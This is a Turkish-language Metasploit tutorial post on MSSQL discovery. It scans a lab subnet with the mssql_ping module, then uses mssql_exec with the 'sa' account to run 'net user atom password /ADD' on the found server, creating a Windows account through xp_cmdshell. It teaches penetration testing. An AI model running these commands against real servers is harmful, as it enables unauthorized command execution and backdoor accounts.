---
draft: false

title:  'MSF İçinde MSSQL Tarama'
date: '2017-05-16T12:52:00+03:00'
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))

description:  'Metasploit Framework’ün kullanıcıya sağladığı imkanlardan bir tanesi de dahil bulunduğunuz ağdaki diğer Ip adreslerinde MSSQL kurulumunun olup olmadığını araştırabilmenizdir. Bunun için UDP tarama ile iz araması yapılır.' 
 
url:  /tr/msf-icinde-mssql-tarama/
 
featured_image: /images/metasploit.jpg
categories:
    - 'Metasploit Framework'
tags:
    - cybersecurity
    - 'metasploit framework'
---


Metasploit Framework’ün kullanıcıya sağladığı imkanlardan bir tanesi de dahil bulunduğunuz ağdaki diğer Ip adreslerinde MSSQL kurulumunun olup olmadığını araştırabilmenizdir. Bunun için UDP tarama ile iz araması yapılır.



MSSQL ilk kurulduğunda varsayılan olara 1433 numaralı porttan dinleme yapar. Dinlemenin, 1433 portundan değil de rastgele seçilen portlardan yapılması ayarlanmış olabilir. Bu durumda da 1434 numaralı porta, dinlemenin hangi porttan yapıldığı sorulabilir.



Aşağıdaki örnekte, öncelikle içinde `mssql` ifadesi geçen modüller aranmaktadır.


```bash
msf **&gt;** search mssql

Matching Modules
**================**

   Name                                                      Disclosure Date  Rank       Description
   ----                                                      ---------------  ----       -----------
   auxiliary/admin/mssql/mssql_enum                                           normal     Microsoft SQL Server Configuration Enumerator
   auxiliary/admin/mssql/mssql_enum_domain_accounts                           normal     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                      normal     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
   auxiliary/admin/mssql/mssql_enum_sql_logins                                normal     Microsoft SQL Server SUSER_SNAME SQL Logins Enumeration
   auxiliary/admin/mssql/mssql_escalate_dbowner                               normal     Microsoft SQL Server Escalate Db_Owner
   auxiliary/admin/mssql/mssql_escalate_dbowner_sqli                          normal     Microsoft SQL Server SQLi Escalate Db_Owner
   auxiliary/admin/mssql/mssql_escalate_execute_as                            normal     Microsoft SQL Server Escalate EXECUTE AS
   auxiliary/admin/mssql/mssql_escalate_execute_as_sqli                       normal     Microsoft SQL Server SQLi Escalate Execute AS
   auxiliary/admin/mssql/mssql_exec                                           normal     Microsoft SQL Server xp_cmdshell Command Execution
   auxiliary/admin/mssql/mssql_findandsampledata                              normal     Microsoft SQL Server Find and Sample Data
   auxiliary/admin/mssql/mssql_idf                                            normal     Microsoft SQL Server Interesting Data Finder
   auxiliary/admin/mssql/mssql_ntlm_stealer                                   normal     Microsoft SQL Server NTLM Stealer
   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                              normal     Microsoft SQL Server SQLi NTLM Stealer
   auxiliary/admin/mssql/mssql_sql                                            normal     Microsoft SQL Server Generic Query
   auxiliary/admin/mssql/mssql_sql_file                                       normal     Microsoft SQL Server Generic Query from File
   auxiliary/analyze/jtr_mssql_fast                                           normal     John the Ripper MS SQL Password Cracker **(**Fast Mode**)**
   auxiliary/gather/lansweeper_collector                                      normal     Lansweeper Credential Collector
   auxiliary/scanner/mssql/mssql_hashdump                                     normal     MSSQL Password Hashdump
   auxiliary/scanner/mssql/mssql_login                                        normal     MSSQL Login Utility
   auxiliary/scanner/mssql/mssql_ping                                         normal     MSSQL Ping Utility
   auxiliary/scanner/mssql/mssql_schemadump                                   normal     MSSQL Schema Dump
   auxiliary/server/capture/mssql                                             normal     Authentication Capture: MSSQL
   exploit/windows/iis/msadc                                 1998-07-17       excellent  MS99-025 Microsoft IIS MDAC msadcs.dll RDS Arbitrary Remote Command Execution
   exploit/windows/mssql/lyris_listmanager_weak_pass         2005-12-08       excellent  Lyris ListManager MSDE Weak sa Password
   exploit/windows/mssql/ms02_039_slammer                    2002-07-24       good       MS02-039 Microsoft SQL Server Resolution Overflow
   exploit/windows/mssql/ms02_056_hello                      2002-08-05       good       MS02-056 Microsoft SQL Server Hello Overflow
   exploit/windows/mssql/ms09_004_sp_replwritetovarbin       2008-12-09       good       MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption
   exploit/windows/mssql/ms09_004_sp_replwritetovarbin_sqli  2008-12-09       excellent  MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption via SQL Injection
   exploit/windows/mssql/mssql_clr_payload                   1999-01-01       excellent  Microsoft SQL Server Clr Stored Procedure Payload Execution
   exploit/windows/mssql/mssql_linkcrawler                   2000-01-01       great      Microsoft SQL Server Database Link Crawling Command Execution
   exploit/windows/mssql/mssql_payload                       2000-05-30       excellent  Microsoft SQL Server Payload Execution
   exploit/windows/mssql/mssql_payload_sqli                  2000-05-30       excellent  Microsoft SQL Server Payload Execution via SQL Injection
   post/windows/gather/credentials/mssql_local_hashdump                       normal     Windows Gather Local SQL Server Hash Dump
   post/windows/manage/mssql_local_auth_bypass                                normal     Windows Manage Local Microsoft SQL Server Authorization Bypass
```



Listelenen modüllerden `auxiliary/scanner/mssql/mssql_ping` isimli modülü kullanacağız. Aşağıdaki örnekte `10.211.55.1/24` IP adres aralığına MSSQL taraması yapılmaktadır.


```bash
msf **&gt;** use auxiliary/scanner/mssql/mssql_ping
msf auxiliary**(**mssql_ping**)** **&gt;** show options

Module options **(**auxiliary/scanner/mssql/mssql_ping**)**:

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   PASSWORD                              no        The password **for **the specified username
   RHOSTS                                yes       The target address range or CIDR identifier
   TDSENCRYPTION        false            yes       Use TLS/SSL **for **TDS data "Force Encryption"
   THREADS              1                yes       The number of concurrent threads
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification **(**requires DOMAIN option set**)**

msf auxiliary**(**mssql_ping**)** **&gt;** set RHOSTS 10.211.55.1/24
RHOSTS **=&gt;** 10.211.55.1/24
msf auxiliary**(**mssql_ping**)** **&gt;** exploit

**[*********]** SQL Server information **for **10.211.55.128:
**[*********]** tcp **=** 1433
**[*********]** np **=** SSHACKTHISBOX-0pipesqlquery
**[*********]** Version **=** 8.00.194
**[*********]** InstanceName **=** MSSQLSERVER
**[*********]** IsClustered **=** No
**[*********]** ServerName **=** SSHACKTHISBOX-0
**[*********]** Auxiliary module execution completed
```



Sonuçta görüldüğü gibi `10.211.55.128` IP adresinde ve 1433 numaralı Portta MSSQL servisi çalışmaktadır. Bu noktadan sonra `mssql_exec` modülü kullanılarak **brute-force** denemeleri yapılabilir. Alternatif olarak medusa veya THC-Hydra kullanılabilir.


```bash
msf auxiliary**(**mssql_login**)** **&gt;** use auxiliary/admin/mssql/mssql_exec
msf auxiliary**(**mssql_exec**)** **&gt;** show options

Module options **(**auxiliary/admin/mssql/mssql_exec**)**:

   Name                 Current Setting                       Required  Description
   ----                 ---------------                       --------  -----------
   CMD                  cmd.exe /c echo OWNED **&gt;** C:\owned.exe  no        Command to execute
   PASSWORD                                                   no        The password **for **the specified username
   RHOST                                                      yes       The target address
   RPORT                1433                                  yes       The target port **(**TCP**)**
   TDSENCRYPTION        false                                 yes       Use TLS/SSL **for **TDS data "Force Encryption"
   USERNAME             sa                                    no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false                                 yes       Use windows authentification **(**requires DOMAIN option set**)**


msf auxiliary**(**mssql_exec**)** **&gt;** set RHOST 10.211.55.128
RHOST **=&gt;** 10.211.55.128
msf auxiliary**(**mssql_exec**)** **&gt;** set MSSQL_PASS password
MSSQL_PASS **=&gt;** password
msf auxiliary**(**mssql_exec**)** **&gt;** set CMD net user atom password /ADD
cmd **=&gt;** net user atom password /ADD
msf auxiliary**(**mssql_exec**)** **&gt;** exploit
```



Yukarıdaki örnekte, exploit başarılı olduğu takdirde, `net user atom password /ADD` komutunun gönderilerek MSSQL veri tabanına bir kullanıcı eklenmektedir. Bu komutun, `set CMD net user atom password /ADD` ile CMD değişkenine girildiğine dikkat edin.
